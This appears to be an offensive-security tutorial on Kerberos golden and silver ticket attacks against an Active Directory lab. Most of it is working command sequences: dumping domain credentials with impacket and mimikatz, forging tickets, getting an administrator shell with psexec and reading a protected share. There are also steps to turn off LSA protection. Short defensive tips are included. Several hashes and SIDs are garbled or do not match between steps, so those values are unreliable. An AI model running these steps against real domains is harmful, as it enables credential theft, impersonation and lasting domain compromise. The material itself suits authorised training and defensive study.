# Ticket Forging Attacks
Given that the Kerberos protocol uses tickets such as **TGT** and  **TGS** as part of the key exchange flow, there is a class of attacks known as **forging attacks** characterized by the forging of malicious tickets that can be used to impersonate users in order to access services within the domain. 

There are many different types of forging attacks, such as : 
- Silver Ticket Attack 
- Golden Ticket Attack 
- Diamond Ticket Attack 
- Sapphire Ticket Attack
## Golden Ticket Attack
The -Golden Ticket Attack— allows to create forged TGT without
interacting with the KDC. That is, the initial exchange of AS-REP
and AS-REQ messages are skipped. The interaction with the KDC only
happens for exchanging the forged TGT into a TGS through the
messages TGS-REQ and TGS-REP.

Requirements :
- Domain name 
- Domain SID
- NTLM hash of the KRBTGT account
- Username we want to impersonate

Consequences :
- Impersonate any user of the domain
### Obtain Domain SID and KRBTGT NTLM Hash
To obtain the domain SID there are two different **Methods** , involving different tools
#### First Method
Consider **impacket** and assume we have admin credential
```shell
python3 -m venv venv
. venv/bin/activate
pip3 install impacket
```

Enumerate domain SID
```shell
lookupsid . py "administrator : Password123!
```

```output
Brute forcing SIDs at 192.168.122.3@
StringBinding ncacn_np:192.168.122.3@[\pipe\lsarpc]
Domain SID is: s-1-5-21-22737@8531-2432934561-2696658194
498: HEXDUMP\Enterprise Read-only Domain controllers (sidTypeGroup)
HEXDUMP\Administrator (sidTypeUser)
```

AS we can see, the domain SID is
```example
s-1-5-21-2273708531-2432934561-2696658194
```

we can then extract the **krbtgt** hash and domain name
```bash
secretsdump.py "administrator:Password123!"@192.168.122.30	-outputfile krb	-user-status
```

```output
Impacket vo.12.@ - copyright Fortra, LLC and its affiliated companies
[A] service RemoteRegistry is in stopped state
[ Starting service RemoteRegistry
[ Target system bootKey: oxe85996277a95c16df5b512b54b022890
[ * ] Dumping local SAM hashes (uid: rid: Imhash:nthash)
Administrator : 500 : : 2b576acbe6bcfda7294d6bd18@41b8fe: : :
Guest : 501 : aad3b435b51404eeaad3b435b51404ee : 31d6cfeOd16ae931b73c59d7eoc089co: : :
Defau ltAccount : 503 : aad3b435b51404eeaad3b435b51404ee : 31d6cfe@d16ae931b73c59d7eoc089co : : :
[ Dumping Domain Credentials (domain\uid:rid: Imhash:nthash)
[ * ] using the DRSUAPI method to get NTDS.DIT secrets
Administ rator : 500 : : 2b576acbe6bcfda 7294d6bd18041b8fe: : : (status-Enabled)
Guest : 501 : aad3b435b51404eeaad3b435b514@4ee : 31d6cfeod16ae931b73c59d7eoc@89co: : : (status—Enab led)
krbtgt : : : • ( status=DisabIed )
hexdump. tab\ leo : 1103 : aad3b435b51404eeaad3b435b514@4ee : 2b576acbe6bcfda7294d6bd18041b8fe: : : (status-Enab led)
hexdump . lab\asrep : 1109 : aad3b435b51404eeaad3b435b514@4ee : 859d2fababafec50654a8be58f5c 71b2 : : : (status-Enabled)
hexdump. lab\kerberoasting : 1110 : aad3b435b51404eeaad3b435b51404ee : 859d2fababafec50654a8be58f5c71b2 : : : (status-Enabled)
```

AS we can see we have obtained the NTLM hash of the KRBTGT account
```example
0d72117dbb5e29489df175068f399d91
```

And we also have the name of the domain
```example
hexdump.lab
```

#### Second Method 
 Another way to obtain the KRBTGT account ULM hash is through Mimikatz
- https://github.com/gentilkiwi/mimikatz
```powershell
iwr -uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip	-Outfile mimikatz_trunk.zip 

Expand-Archive -Path 'mimikatz_trunk.zip'

cd . . \mimikatz_trunk\x64\
.\mimikatz.exe
```

Once you have a privileged mimikatz session, execute the following
```powershell
privilege::debug
lsadump::Isa / inject /name:krbtgt
```

### Forge a custom TGT
Regardless of how we obtain the two information, once we have them,
we can forge arbitrary TGT with custom malicious data.

Consider the **ticketer.py** script, included in the **impacket** suite. The duration of the tickets created like this is fixed to 10 years from the moment of creation.

```shell
ticketer.py -nthash 0d72117dbb5e29489df175068f399d91 -domain-sid S-1-5-21-2273708531 2432934561-2696658194 -domain hexdump.lab administrator
```


The previous command should have generated an
**administrator.ccache**, which contains the TGT saved in the **ccache**
format. Notice that there is also another format for saving kerberos
tickets, which is known as the **kirbi** format, which is used by
**Mimikatz** for example.

To convert from a **ccache** to **kirbi** proceed as follows

```shell 
export
KRB5CCNAME=/home/leo/projects/YOUTUBE/yt-en/TBD-active-directory-TBD-ticket-forging-attacks/content/data/administrator.ccache
ticketconverter.py /home/leo/proj ects/YOUTUBE/yt-en/ TBD-active-directory-TBD- ticket-forging-attacks/content/data/administrator.ccache administrator.kirbi
```

At the end we have the two different formats
```bash
-rw-r--r-- 1 leo leo 1.2K Apr 20 03:24 administrator.ccache
-rw-r--r-- 1 leo leo 1.3K Apr 20 03:41 administrator.kirbi
```

### Use the custom TGT
Once we have the tickets we can use them either from
attacker machine or from a windows attacker machine.
for example that we're working from a linux attacker

First, we set the ticket into the active cache
```bash
export KRB5CCNAME=/path/to/your-ticket.ccache
```

We can check currently activated tickets with **klist**
```bash
klist
```

```output
Ticket cache: FILE:/home/ leo/proj ects/YOUTUBE/yt-en/TBD-active-directory-TBD- ticket-forging-attacks/cont ent/data/administrator.ccache
Default principal: administrator@HEXDUMP.LAB
```

Then, we can execute **psexec.py** to authenticate with kerberos using the created ticket and obtain our shell as administrator
```bash
sudo ntpdate -u 192.168.122.30 # to syncrontze time, if clock skew is too great
psexec-py -k -no-pass hexdump.lab/administrator@dc01.hexdump.lab
```

And, we will get our **Administrator Shell**
### Consequences and Protections
Notice that even if the administrator changes it's password, we can still use the NTLM hash of the KRBTGT account to forge new TGT tickets.

Thus, this attack can be very powerful when it comes to **persistence** , and it is often employed by APT (Advanced Persistent Threat) groups after an initial compromise.

To protect against such attacks :
- Regularly rotate the KRBTGT password
- Enforce least privilege
- Enable additional authentication mechanisms like MFA
- Enable LSA Protetion (RunAsPPL) on LSASS

To check if you have enabled LSA Protection
```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL"
```

To enable LSA Protection
```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
```

To remove LSA Protection
```powershell
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /f
```

Actually, when you enable LSA protection, a variable in EUFI is initialized too. And when you disable at the level of the OS, the UEFI variable does not change. To actually change it, you need to
download a UEFI program and execute the following
- Remove the LSA protection UEFI variable
- https://www.microsoft.com/en-us/download/detaiIs.aspx?id=40897

```powershell
mountvol X: /s
copy C:\LSAPPLConfig.efi X:\EFI\Microsoft\Boot\LSAPPLConfig.efi /Y

bcdedit /create {cb3b571-2f2e-4343-a879-d86a476d7215} /d "Debug Tool" /application osloader
bcdedit /set {cb3b571-2f2e-4343-a879-d86a476d7215} path \EFI\Microsoft\Boot\LSAPPLConfig.efi
bcdedit /set {bootmgr} bootsequence {cb3b571-2f2e-4343-a879-d86a476d7215}
bcdedit /set {cb3b571-2f2e-4343-a879-d86a476d7215} loadoptions 0x01
bcdedit /set {cb3b571-2f2e-4343-a879-d86a476d7215} device partition=X:

mountvol X: /d

```

## Silver Ticket Attack
The **Silver Ticket Attack** is based on the forging of custom TGS without interaction with the KDC. These tickets can be used to gain access to new services and to maintain persistence on a compromised system

Requirements :
- Domain name
- Domain SID
- SPN of the service to attack
- NTLM hash of the service account to attack
- Privileged Account certificate (PAC) validation is disabled

Consequences :
- Grants access to resources provided by the compromised service.

Differences with respect to Golden Ticket :
- Golden ticket requires NTLM hash of the KRBTGT account, while 
  Silver ticket requires NTLM hash of a service account
- Silver tickets can be forged offline without prior communication
  with the KDC/AS
### In Theory
The attack works as follows
1. Attacker obtains NTLM password hash of a service account
2. Using the hash, a malicious TGS is created, bypassing normal Kerberos flow
3. Using the forged ticket it becomes possible to authenticate to the service

Given that the forged ticket can contain arbitrary data, an attacker can forge an arbitrary TGS in order to elevate his privileges with respect to the compromised service.

The only way to protect against this attack is to enable PAC validation with the domain controller. This is because PAC represents a critical section of a Kerberos ticket, as it contains
security information about the user  requesting the ticket, such as:
- User SID
- Group memberships
- User rights and privileges
- Authorization data

When forging a malicious TGS, the attacker can write into the PAC arbitrary information. If this data is not explicitly validated by the service receiving such ticket with the domain controller, then
the service will blindly accept such information

Most services do not validate PAC

If PAC is validated however, the silver ticket will be rejected right away if it contains non valid information (which is what the attack is based on).
### In Practice
Let's use a silver ticket attack to gain unauthorized access to the **Common Internet File System Service** (CIFS). To do this we can use the NTLM hash of the machine account rather than the NTLM hash of a specific service. This is because to each computer hosts there are
associated multiple services, one of which is CIFS

#### Step 1: Leak NTLM Hash of DC01$
Let's assume we have leaked NTLM hash of the machine account with **mimikatz**
```powershell
PS C:\Users\Administrator\Desktop\mimikatz_trunk\x64> .\mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

And , capture the ==NTLM HASH== 
#### Step 2: Obtain Domain SID
Next step is to find the Domain SID, which you can find with a simple command, on any user of the domain
```powershell
whoami /user
```

```output
Example: s-1-5-i1-22737@8531-2432934561-2696658194
```

*Sometimes it is possible to enumerate such value from a external position in the network, however it requires some network connectivity such as SMB with null session enabled* 

#### Step 3: Forge the Silver Ticket
At this point we have all the information we need to forge our ticket 

Multiple tools can be used to forge the silver ticket 
Let's consider **mimikatz**

Let's assume we have a low privileged access to a workstation
joined into the domain 
```example
PS C:\Users\leo> whoami
hexdump\leo
PS C:\Users\leo> hostname
QUICKEM-KFG06SG
```

Let's also assume there is an SMB share at dc01.hexdump.lab/Shared which contains a file named **secret .txt**

Initially however we cannot access such share
```powershell
dir \\dc01.hexdump.lab\Shared
```

Initially we have the following tickets

```powershell
PS C:\Users\leo> klist
```

And we can see the 
``` output
Server: clfs/DC01.hecdump.lab @ HEXDUMP.LAB 
``` 

Let's now use **mimikatz** to generate a new silver ticket, which should grant us access to that share as administrator

```powershell
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "mimikatz_trunk.zip"
Expand-Archive -Path "mimikatz_trunk.zip" 
cd .\mimikatz_trunk\x64\
.\mimikatz.exe
```

To generate the ticket we can use the command 
```powershell
kerberos::golden
```

```
Kerberos::golden /sid:s-1-5-21-22737@8531-2432934561-2696658194 /domain:hexdump. lab / target:dc€l.hexdump. lab /service:cifs / user : administrator / id : 1339 /ptt
```

Notice the arguments:
- **/sid**, the domain SID
- **/domain**, the domain name
- **/target**, the name of the computer that hosts the service we want touse
- **/service**, the name of the service
- **/rc4**, the NTLM hash of the machine account
- **/user** the username we want to impersonate
- **/id**, the ID visible in the event logs. can be chosen randomly
- **/ptt**, inject the ticket directly in the process

And , Now we can access the ==Share==
```powershell
dir \\dc01.hexdump.lab\Shared
more \\dc01.hexdump.lab\Shared\Secret.txt
```
